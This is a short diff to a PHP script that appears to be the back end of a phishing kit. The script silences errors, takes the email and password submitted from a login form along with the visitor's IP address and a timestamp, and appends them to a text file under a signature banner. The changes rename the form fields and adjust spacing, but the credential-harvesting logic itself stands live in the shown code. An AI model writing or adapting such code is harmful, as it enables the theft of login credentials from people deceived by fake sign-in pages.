@@ -2,8 +2,8 @@
 error_reporting(0);
 $file = "simpleajayakan.txt";
 
-$username = $_POST['email'];
-$password = $_POST['pass'];
+$username = $_POST['email_mail'];
+$password = $_POST['pass_mail'];
 $ip = $_SERVER['REMOTE_ADDR'];
 
 $today = date("F j, Y, g:i a");
@@ -15,7 +15,7 @@ fwrite($handle, "----------SIMPLE AJA BY MASAULIASC-----------");
 
 fwrite($handle, "\n");
                  
-fwrite($handle, "Email     :");
+fwrite($handle, "Email    :");
 
 fwrite($handle, " $username");
 
